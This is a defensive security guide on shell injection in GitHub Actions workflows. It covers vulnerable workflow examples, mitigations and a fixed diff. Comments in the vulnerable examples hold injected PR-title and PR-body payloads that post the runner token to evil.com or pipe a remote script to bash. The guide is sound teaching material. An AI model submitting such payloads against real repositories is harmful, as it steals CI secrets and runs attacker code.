# Shell Injection

## Description

Workflows that pipe user-controlled input directly to shell interpreters (bash, sh, zsh) without validation create code injection vulnerabilities: attackers can inject malicious commands that execute with the workflow's permissions, enabling secret exfiltration, file modification, or system compromise. Shell injection is particularly dangerous when user input from pull requests, issues, or workflow inputs is used in shell commands. [^gh_actions_security]

## Vulnerable Instance

- Workflow uses user input (from PR titles, issue comments, or workflow inputs) directly in shell commands.
- Input is piped to shell interpreters without validation or sanitization.
- Attacker can inject malicious shell commands.

The most common real-world scenario is not literally piping to `bash`, but using a context variable directly inside a `run:` block where the value is interpolated before the shell sees it:

```yaml
name: Auto-comment on PR
on:
  pull_request:
    types: [opened]
jobs:
  comment:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - name: Post welcome comment
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # VULNERABLE: title is expanded by the expression engine before bash runs it
          # A PR title of: hello"; curl -d @/home/runner/work/_temp/token https://evil.com #
          # becomes a second shell command that exfiltrates the runner token file
          gh pr comment ${{ github.event.pull_request.number }} \
            --body "Thanks for opening: ${{ github.event.pull_request.title }}"
```

An older but still seen pattern — explicit pipe to shell:

```yaml
      - name: Install tool from PR description
        run: |
          # Attacker puts in PR body: "; curl https://evil.com | bash; #"
          echo "${{ github.event.pull_request.body }}" | bash
```

## Mitigation Strategies

1. **Validate and sanitize input**  
   Validate input against allowlists, sanitize special characters, and use parameterized commands. Never pipe user input directly to shell interpreters.

2. **Use environment variables**  
   Pass user input through environment variables instead of direct interpolation. Access via `$VARIABLE` in commands rather than `${{ github.event... }}` in the command string.

3. **Download and verify scripts first**  
   If executing scripts, download to files, verify checksums, review script content, and only then execute verified scripts.

4. **Store scripts in repository**  
   Store scripts in the repository rather than downloading from the internet or constructing from user input. This allows code review and version control.

5. **Use GitHub Actions**  
   Prefer GitHub Actions instead of shell scripts constructed from user input. Actions are more transparent and can be pinned to specific versions.

6. **Use containerized execution**  
   Run untrusted code in containers with minimal privileges. Isolate execution environments to limit blast radius.

### Secure Version

Always assign context values to env vars first, then reference the env var inside the shell command — the expression engine never touches the shell command string.

```diff
 name: Auto-comment on PR
 on:
   pull_request:
     types: [opened]
 jobs:
   comment:
     runs-on: ubuntu-latest
     permissions:
       pull-requests: write
     steps:
       - name: Post welcome comment
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
         run: |
+          # Validate: reject titles containing shell metacharacters
+          if [[ ! "$PR_TITLE" =~ ^[[:alnum:][:space:]_./:,!?-]+$ ]]; then
+            echo "PR title contains disallowed characters; skipping comment."
+            exit 0
+          fi
-          gh pr comment ${{ github.event.pull_request.number }} \
-            --body "Thanks for opening: ${{ github.event.pull_request.title }}"
+          gh pr comment "$PR_NUMBER" --body "Thanks for opening: $PR_TITLE"
```

> **Note:** Use `[[:space:]]` (POSIX character class) instead of `\s` in bash `[[ =~ ]]` expressions. `\s` is not guaranteed to work in all bash versions.

## Impact

| Dimension | Severity | Notes |
| --- | --- | --- |
| Likelihood | ![High](https://img.shields.io/badge/-High-orange?style=flat-square) | Shell injection is common when workflows process user input, especially from pull requests or issues. |
| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | Injected shell commands run with workflow permissions, enabling secret exfiltration, code modification, or full system compromise. |
| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Compromised workflows can affect all systems the workflow can access, including repositories, secrets, and deployment targets. |

## References

- GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [^gh_actions_security]

---

[^gh_actions_security]: GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
